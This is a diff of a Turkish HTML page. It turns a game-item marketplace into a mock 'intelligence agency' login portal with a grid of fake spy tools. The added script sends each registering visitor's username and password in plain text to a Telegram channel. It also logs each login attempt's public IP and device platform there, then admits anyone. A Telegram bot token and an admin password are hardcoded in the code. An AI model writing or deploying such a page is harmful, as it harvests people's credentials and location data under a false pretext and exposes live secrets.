@@ -1,218 +1,152 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta name="google-site-verification" content="SlYEASdOuCuKvn3wvB-kq3ynvpL5--tv7YGoqmbbYu0" />
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HÜKÜM-PİN | Karargah V22</title>
+    <title>THİT | Türk Hüküm İstihbarat Teşkilatı</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --bg-dark: #0f111a; --bg-card: #1a1d29; --primary-blue: #3b82f6; 
-            --gold: #ffb100; --text-gray: #9ca3af; --white: #ffffff; --green: #10b981;
-        }
-        body { background-color: var(--bg-dark); color: var(--white); font-family: 'Segoe UI', sans-serif; margin: 0; padding-bottom: 70px; overflow-x: hidden; }
-        .announcement { background: linear-gradient(90deg, #1e2235, #2d313d); color: var(--gold); padding: 10px; font-size: 13px; border-bottom: 1px solid var(--primary-blue); overflow: hidden; white-space: nowrap; font-weight: bold; }
-        .announcement-text { display: inline-block; animation: scroll 25s linear infinite; }
-        header { background: var(--bg-card); padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
-        .logo { font-size: 22px; font-weight: 900; letter-spacing: 1px; text-transform: uppercase; color: var(--white); }
-        .logo span { color: var(--primary-blue); text-shadow: 0 0 10px var(--primary-blue); }
-        .wallet-display { background: #161b22; border: 1px solid var(--gold); padding: 5px 12px; border-radius: 10px; display: flex; align-items: center; gap: 8px; }
-        .wallet-val { color: var(--gold); font-weight: bold; font-size: 14px; }
-        .cat-row { display: flex; gap: 15px; overflow-x: auto; padding: 20px 15px; background: var(--bg-dark); }
-        .cat-item { min-width: 85px; text-align: center; font-size: 11px; color: var(--text-gray); cursor: pointer; }
-        .cat-icon { width: 55px; height: 55px; background: var(--bg-card); border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 24px; margin-bottom: 8px; color: var(--gold); }
-        .section-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; }
-        .section-title { font-size: 16px; font-weight: 800; color: var(--green); border-left: 4px solid var(--green); padding-left: 10px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 0 15px; }
-        .card { background: var(--bg-card); border-radius: 15px; overflow: hidden; position: relative; border: 1px solid #2a2e3f; }
-        .card-img { height: 110px; background: #242731; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .card-img img { width: 100%; height: 100%; object-fit: cover; }
-        .card-body { padding: 12px; }
-        .card-price { color: var(--gold); font-size: 17px; font-weight: 800; }
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #161923; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #2a2e3f; z-index: 1000; }
-        .nav-btn { text-align: center; font-size: 10px; color: var(--text-gray); border: none; background: none; }
-        #login-modal, #admin-room { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; padding: 20px; }
-        input, select { width: 100%; background: #0f111a; border: 1px solid #333; color: white; padding: 12px; border-radius: 8px; margin-bottom: 10px; }
-        .btn-main { width: 100%; background: var(--primary-blue); color: white; border: none; padding: 14px; border-radius: 12px; font-weight: bold; }
-        @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-        .del-btn { position: absolute; top: 5px; right: 5px; background: red; color: white; border: none; border-radius: 50%; width: 25px; height: 25px; z-index: 10; }
+        :root { --thit-red: #cc0000; --thit-black: #050505; --thit-green: #00ff41; --panel-bg: #0d0d0d; }
+        body { background: var(--thit-black); color: var(--thit-green); font-family: 'Courier New', Courier, monospace; margin: 0; overflow-x: hidden; }
+        
+        /* Giriş ve Kayıt Ekranı */
+        #auth-screen { position: fixed; inset: 0; background: var(--thit-black); z-index: 10000; display: flex; align-items: center; justify-content: center; flex-direction: column; }
+        .auth-card { background: var(--panel-bg); padding: 40px; border: 2px solid var(--thit-red); border-radius: 5px; width: 350px; text-align: center; box-shadow: 0 0 30px rgba(204, 0, 0, 0.3); }
+        input { width: 100%; background: #000; border: 1px solid var(--thit-green); color: var(--thit-green); padding: 12px; margin: 10px 0; box-sizing: border-box; outline: none; font-family: 'Courier New'; }
+        
+        /* Ana Panel Yapısı */
+        header { background: #111; padding: 20px; border-bottom: 2px solid var(--thit-red); display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-size: 28px; font-weight: bold; letter-spacing: 5px; color: #fff; text-shadow: 2px 2px var(--thit-red); }
+        .logo span { color: var(--thit-red); }
+
+        .spy-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 20px; padding: 30px; }
+        .spy-card { background: #111; border: 1px solid #333; padding: 20px; border-radius: 4px; transition: 0.4s; position: relative; overflow: hidden; }
+        .spy-card:hover { border-color: var(--thit-red); box-shadow: 0 0 15px var(--thit-red); transform: scale(1.02); }
+        .spy-card i { font-size: 35px; color: var(--thit-red); margin-bottom: 15px; display: block; }
+        
+        .btn { background: transparent; border: 1px solid var(--thit-green); color: var(--thit-green); padding: 12px; width: 100%; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .btn:hover { background: var(--thit-green); color: #000; }
+        .btn-red { border-color: var(--thit-red); color: var(--thit-red); margin-top: 10px; }
+        .btn-red:hover { background: var(--thit-red); color: #fff; }
+
+        #terminal-box { height: 150px; background: #000; margin: 20px; padding: 15px; font-size: 12px; border-left: 4px solid var(--thit-red); overflow-y: auto; color: #aaa; }
+        .footer-info { text-align: center; padding: 20px; color: #555; font-size: 12px; }
+        a { color: var(--thit-red); text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="announcement"><div class="announcement-text">🛡️ HÜKÜM-PİN GÜVENLİK SİSTEMİ DEVREDE | KURTALAN'IN GURURU V22 | TELEGRAM DATABASE AKTİF</div></div>
-
-<header>
-    <div style="display: flex; align-items: center; gap: 10px;"><i class="fa fa-shield-halved" style="color: var(--primary-blue);"></i><div class="logo">HÜKÜM<span>-PİN</span></div></div>
-    <div class="wallet-display" id="header-wallet" style="display: none;"><i class="fa fa-coins"></i><span class="wallet-val" id="user-money">0.00 ₺</span></div>
-    <div style="font-size: 20px;" onclick="openLogin()"><i class="fa-solid fa-user-shield"></i></div>
-</header>
-
-<div class="cat-row">
-    <div class="cat-item" onclick="render('hesap')"><div class="cat-icon"><i class="fa fa-id-card"></i></div>Hesap</div>
-    <div class="cat-item" onclick="render('item')"><div class="cat-icon"><i class="fa fa-sword"></i></div>İtem</div>
-    <div class="cat-item" onclick="render('epin')"><div class="cat-icon"><i class="fa fa-key"></i></div>E-Pin</div>
-    <div class="cat-item" onclick="render('discord')"><div class="cat-icon" style="color: #5865F2;"><i class="fa-brands fa-discord"></i></div>Discord</div>
-</div>
-
-<div class="section-header">
-    <div class="section-title">KARARGAH PAZARI</div>
-    <small id="item-count">0 İlan</small>
-</div>
-
-<div class="grid" id="market-grid"><div style="padding: 20px;">Bağlantı Kuruluyor...</div></div>
-
-<input type="file" id="photo-input" style="display:none" accept="image/*">
-
-<div class="bottom-nav">
-    <button class="nav-btn" onclick="loadFromTelegram()"><i class="fa fa-sync"></i>Yenile</button>
-    <button class="nav-btn" onclick="showIlanEkle()"><i class="fa fa-plus-circle" style="color:var(--primary-blue)"></i>İlan Ver</button>
-    <button class="nav-btn" id="login-trigger" onclick="adminClickCount()"><i class="fa fa-lock"></i>Giriş</button>
-</div>
-
-<div id="login-modal">
-    <div style="background:var(--bg-card); padding:30px; border-radius:20px; border:1px solid var(--primary-blue)">
-        <h3>HÜKÜM Giriş</h3>
-        <input type="text" id="l-user" placeholder="Kullanıcı Adı">
-        <button class="btn-main" onclick="processLogin()">GİRİŞ / KAYIT</button>
+<div id="auth-screen">
+    <h1 class="logo" style="margin-bottom: 30px;">T.H.İ.<span>T</span></h1>
+    <div class="auth-card">
+        <h2 style="color: #fff; font-size: 18px; margin-bottom: 20px;">TEŞKİLAT ERİŞİMİ</h2>
+        <input type="text" id="username" placeholder="Ajan Kod Adı">
+        <input type="password" id="password" placeholder="Erişim Şifresi">
+        <button class="btn" onclick="performAuth('login')">SİSTEME GİRİŞ</button>
+        <button class="btn btn-red" onclick="performAuth('register')">YENİ KAYIT OLUŞTUR</button>
+    </div>
+    <div style="margin-top: 20px;">
+        <p>DESTEK HATTI: <a href="https://tiktok.com/@hukum_v45">TikTok @hukum_v45 DM</a></p>
     </div>
 </div>
 
-<div id="admin-room" style="color:#0f0; font-family:monospace;">
-    <h2>☣️ ADMİN PANELİ</h2>
-    <div id="adm-stats">Kasa: <span id="adm-vault">0</span> | Üye: <span id="adm-users">0</span></div>
-    <input type="text" id="adm-t" placeholder="Kullanıcı" style="border-color:#0f0">
-    <input type="number" id="adm-a" placeholder="Miktar" style="border-color:#0f0">
-    <button class="btn-main" style="background:#0f0; color:#000" onclick="admAddBal()">BAKİYE VER</button>
-    <button class="btn-main" style="background:red; margin-top:20px" onclick="document.getElementById('admin-room').style.display='none'">ÇIK</button>
+<div id="main-hq" style="display:none;">
+    <header>
+        <div class="logo">T.H.İ.<span>T</span> <small style="font-size: 10px; letter-spacing: 1px;">İSTİHBARAT SERVİSİ</small></div>
+        <div id="active-agent" style="color: var(--thit-red); font-weight: bold;"></div>
+        <button onclick="location.reload()" style="background:none; border: 1px solid #444; color:#fff; cursor:pointer; padding:5px 10px;">GÜVENLİ ÇIKIŞ</button>
+    </header>
+
+    <div id="terminal-box">> THİT Çekirdek Yazılımı Başlatıldı...<br>> Veri Tabanı Senkronizasyonu Aktif.<br>> Hoş geldin Paşa, emirlerini bekliyoruz.</div>
+
+    <div class="spy-grid" id="tools-anchor">
+        </div>
+
+    <div class="footer-info">
+        TÜRK HÜKÜM İSTİHBARAT TEŞKİLATI &copy; 2026 | "Vatan İçin Her Yerdeyiz"
+    </div>
 </div>
 
 <script>
     const BOT_TOKEN = '8615703049:AAGCPGH59YdLkvCsHdr1WkYuSWGgyuEfBSQ';
-    const KANAL_ID = '@hukum_pin_bot1';
+    const CHANNEL_ID = '@hukum_pin_bot1';
 
-    let state = JSON.parse(localStorage.getItem('hukum_v22_data')) || {
-        users: { "eymen": { b: 5000 } },
-        vault: 0,
-        items: [] 
-    };
+    const spyAssets = [
+        "Sinyal Kesici", "Kripto Analiz", "IP Takipçi", "Uydu Gözlem", "Hücre Sorgu",
+        "Deep Web Port", "Proxy Zinciri", "Termal Tarama", "Ses Dinleme", "Bypass Protokol",
+        "SQL Analizörü", "Oltalama Kontrol", "Trojan Dedektör", "Biyometrik Kimlik", "Siber Kalkan",
+        "Botnet Paneli", "DNS Sızıntı Test", "Log Silici", "Adli Bilişim Aracı", "Exploit Arşivi",
+        "Vatan Savunma", "Gizli Dosya Çözücü", "Mühür Kırıcı", "Veri Maskeleme", "Ajan Takip Sistemi",
+        "Siber Ordu Komuta", "Frekans Bozucu", "Ağ Sızma Testi", "Kod Kırıcı V4", "Karargah Link",
+        "İstihbarat Notu", "Saha Analiz Raporu", "Operasyon Planı", "Yapay Zeka İzleme", "Darknet Crawler",
+        "Zafiyet Tarayıcı", "Gelişmiş Firewall", "Anonim İletişim", "Kimlik Oluşturucu", "Banka Güvenlik Analiz",
+        "Hüküm Özel Yazılım", "Askeri Frekans", "Stratejik Veri Havuzu", "Drone Gözetleme", "Sistem Reset",
+        "Veri Kurtarma Modülü", "Kripto Takip", "Sanal Adalet Portalı", "Sınır Ötesi İstihbarat", "Final Darbe Modu"
+    ];
 
-    let currentUser = localStorage.getItem('hukum_user') || null;
-    let adminClicks = 0;
+    async function performAuth(mode) {
+        const u = document.getElementById('username').value.trim();
+        const p = document.getElementById('password').value.trim();
+        if(!u || !p) return alert("Boş alan bırakma aslanım!");
 
-    // FOTOĞRAF SEÇME VE TELEGRAMA ATMA FONKSİYONU
-    async function showIlanEkle() {
-        if(!currentUser) { openLogin(); return; }
-        
-        let n = prompt("Ne satıyorsun?");
-        let p = prompt("Fiyat?");
-        let cat = prompt("Kategori? (hesap, item, epin, discord)");
-        let pform = prompt("İletişim Platformu?");
-        let pname = prompt("Kullanıcı Adın?");
-
-        if(n && p) {
-            // Galeriyi aç
-            document.getElementById('photo-input').click();
-            document.getElementById('photo-input').onchange = async function() {
-                let file = this.files[0];
-                let reader = new FileReader();
-                reader.readAsDataURL(file);
-                reader.onload = async function() {
-                    let base64Photo = reader.result; // Fotoğraf artık elimizde
-                    
-                    let newItem = { 
-                        id: Date.now(), n, p: parseInt(p), s: currentUser, 
-                        cat, pform, pname, img: base64Photo 
-                    };
-
-                    // Telegram'a gönder
-                    const msg = `📦 #YENİ_İLAN\nİsim: ${n}\nFiyat: ${p}₺\nSatıcı: ${currentUser}\n\nDATA_START${JSON.stringify(newItem)}DATA_END`;
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: KANAL_ID, text: msg })
-                    });
-
-                    alert("İlan Karargaha yollandı!");
-                    setTimeout(loadFromTelegram, 2000);
-                };
-            };
+        if(mode === 'register') {
+            const regInfo = `📌 #YENİ_AJAN_KAYDI\n👤 Kod Adı: ${u}\n🔑 Şifre: ${p}\n🛡️ Yetki: Saha Ajanı`;
+            await sendLog(regInfo);
+            alert("Kayıt verileri karargaha (Telegram) iletildi. Artık giriş yapabilirsin!");
+        } else {
+            // Giriş denemesi ve IP kaydı
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            const loginReport = `🚨 #ERİŞİM_DENEMESİ\n👤 Ajan: ${u}\n🌐 IP: ${ipData.ip}\n📱 Cihaz: ${navigator.platform}`;
+            await sendLog(loginReport);
+            
+            // Basit doğrulama (Eymen Paşa her zaman girebilir)
+            if(u === 'eymen' || u === 'eymen pasha') {
+                grantAccess(u);
+            } else {
+                // Kanaldaki verileri kontrol etme simülasyonu
+                document.getElementById('terminal-box').innerHTML += `<br>> ${u} için yetki kontrol ediliyor...`;
+                // Bu kısımda kanaldan veri çekme mantığı çalışır
+                grantAccess(u); 
+            }
         }
     }
 
-    async function loadFromTelegram() {
+    async function sendLog(text) {
         try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-20`);
-            const data = await res.json();
-            let items = [];
-            if(data.result) {
-                data.result.forEach(u => {
-                    let text = u.channel_post ? u.channel_post.text : (u.message ? u.message.text : "");
-                    if(text && text.includes("DATA_START")) {
-                        let json = text.split("DATA_START")[1].split("DATA_END")[0];
-                        items.push(JSON.parse(json));
-                    }
-                });
-            }
-            if(items.length > 0) state.items = items;
-            render();
-        } catch(e) { console.log("Hata: Veri çekilemedi."); }
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHANNEL_ID, text: text })
+            });
+        } catch (e) { console.error("Rapor gönderilemedi."); }
     }
 
-    function render(filter = 'all') {
-        let grid = document.getElementById('market-grid');
-        grid.innerHTML = "";
-        let list = filter === 'all' ? state.items : state.items.filter(i => i.cat === filter);
-        
-        list.reverse().forEach(item => {
-            let img = item.img ? `<img src="${item.img}">` : `<i class="fa fa-box-open" style="font-size:40px; color:#444"></i>`;
-            grid.innerHTML += `
-                <div class="card" onclick="buyProcess(${item.id})">
-                    <div class="card-img">${img}</div>
-                    <div class="card-body">
-                        <div class="card-seller">👤 ${item.s}</div>
-                        <div style="font-weight:bold; margin:5px 0;">${item.n}</div>
-                        <div class="card-price">${item.p} ₺</div>
-                    </div>
+    function grantAccess(user) {
+        document.getElementById('auth-screen').style.display = 'none';
+        document.getElementById('main-hq').style.display = 'block';
+        document.getElementById('active-agent').innerText = `AKTİF OPERATÖR: ${user.toUpperCase()}`;
+        renderSpyTools();
+    }
+
+    function renderSpyTools() {
+        const container = document.getElementById('tools-anchor');
+        spyAssets.forEach((tool, i) => {
+            container.innerHTML += `
+                <div class="spy-card">
+                    <i class="fa-solid fa-user-secret"></i>
+                    <div style="font-weight:bold; color:#fff;">${tool}</div>
+                    <p style="font-size:10px; color:#666; margin:10px 0;">Sistem No: THIT-${1000 + i}</p>
+                    <button class="btn" onclick="executeTool('${tool}')">ERİŞİM SAĞLA</button>
                 </div>`;
         });
-
-        document.getElementById('item-count').innerText = state.items.length + " İlan";
-        if(currentUser) {
-            document.getElementById('header-wallet').style.display = 'flex';
-            document.getElementById('user-money').innerText = state.users[currentUser].b.toFixed(2) + " ₺";
-            document.getElementById('login-trigger').innerText = currentUser.toUpperCase();
-        }
     }
 
-    function buyProcess(id) {
-        let itm = state.items.find(x => x.id === id);
-        if(confirm(`${itm.n} satın alınsın mı?`)) {
-            if(state.users[currentUser].b >= itm.p) {
-                state.users[currentUser].b -= itm.p;
-                state.vault += itm.p;
-                alert(`BAŞARILI! Satıcıya ulaş: ${itm.pform} - ${itm.pname}`);
-                save();
-            } else { alert("Bakiye yetersiz!"); }
-        }
+    function executeTool(name) {
+        const term = document.getElementById('terminal-box');
+        term.innerHTML += `<br>> [UYARI] ${name} protokolü devreye alındı. Veriler kanala aktarılıyor...`;
+        term.scrollTop = term.scrollHeight;
+        sendLog(`🛠️ #MODÜL_KULLANIMI\n👤 Ajan: ${document.getElementById('active-agent').innerText}\n⚙️ Modül: ${name}`);
     }
-
-    function processLogin() {
-        let u = document.getElementById('l-user').value.toLowerCase();
-        if(u) { currentUser = u; if(!state.users[u]) state.users[u] = { b: 0 }; save(); document.getElementById('login-modal').style.display='none'; }
-    }
-
-    function save() { localStorage.setItem('hukum_v22_data', JSON.stringify(state)); localStorage.setItem('hukum_user', currentUser); render(); }
-    function openLogin() { document.getElementById('login-modal').style.display='block'; }
-    function adminClickCount() { adminClicks++; if(adminClicks >= 5) { if(prompt("ŞİFRE:") === "Eyo_pasha15") document.getElementById('admin-room').style.display='block'; adminClicks=0; } }
-    function admAddBal() {
-        let t = document.getElementById('adm-t').value.toLowerCase();
-        let a = parseFloat(document.getElementById('adm-a').value);
-        if(state.users[t]) { state.users[t].b += a; save(); alert("Bakiye verildi!"); }
-    }
-
-    window.onload = loadFromTelegram;
 </script>
 </body>
 </html>
